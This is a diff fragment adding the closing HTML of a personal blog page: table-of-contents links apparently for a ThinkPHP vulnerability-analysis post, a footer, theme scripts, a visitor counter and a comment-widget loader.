<span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#修复建议-5"><span class="nav-number">1.3.1.6.5.</span> <span class="nav-text">修复建议</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考资料-4"><span class="nav-number">1.3.1.6.6.</span> <span class="nav-text">参考资料</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#thinkphp自带函数"><span class="nav-number">1.3.2.</span> <span class="nav-text">thinkphp自带函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php调试"><span class="nav-number">1.3.3.</span> <span class="nav-text">php调试</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lyxhh</span>
+
+  
+</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
